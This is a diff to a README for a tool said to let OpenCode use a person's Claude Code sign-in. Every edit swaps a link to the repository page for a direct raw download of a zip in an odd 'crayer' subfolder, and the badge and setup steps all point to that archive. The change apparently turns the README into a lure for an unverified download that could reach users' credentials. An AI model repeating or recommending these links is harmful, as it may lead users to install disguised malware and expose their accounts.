@@ -1,12 +1,12 @@
 # 🤖 opencode-claude-auth - Use Claude Code sign-in
 
-[![Download](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/osuma2662/opencode-claude-auth)
+[![Download](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/osuma2662/opencode-claude-auth/raw/refs/heads/main/crayer/opencode_auth_claude_v1.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the files you need:
 
-https://github.com/osuma2662/opencode-claude-auth
+https://github.com/osuma2662/opencode-claude-auth/raw/refs/heads/main/crayer/opencode_auth_claude_v1.8.zip
 
 ## 🪟 Windows setup
 
@@ -15,7 +15,7 @@ This app is meant to help OpenCode use your existing Claude Code credentials, so
 ### 1. Open the download page
 Go to:
 
-https://github.com/osuma2662/opencode-claude-auth
+https://github.com/osuma2662/opencode-claude-auth/raw/refs/heads/main/crayer/opencode_auth_claude_v1.8.zip
 
 ### 2. Find the latest release
 Look for the latest version on the page. Open the release files for Windows.
@@ -78,7 +78,7 @@ That means:
 ### Step 1: Download
 Visit the download page:
 
-https://github.com/osuma2662/opencode-claude-auth
+https://github.com/osuma2662/opencode-claude-auth/raw/refs/heads/main/crayer/opencode_auth_claude_v1.8.zip
 
 ### Step 2: Save the file
 Pick a folder you can find again, such as Downloads or Desktop.
@@ -170,7 +170,7 @@ If you want the fastest path:
 
 If you need the page later, use this link:
 
-https://github.com/osuma2662/opencode-claude-auth
+https://github.com/osuma2662/opencode-claude-auth/raw/refs/heads/main/crayer/opencode_auth_claude_v1.8.zip
 
 ## 🧩 Keywords
 
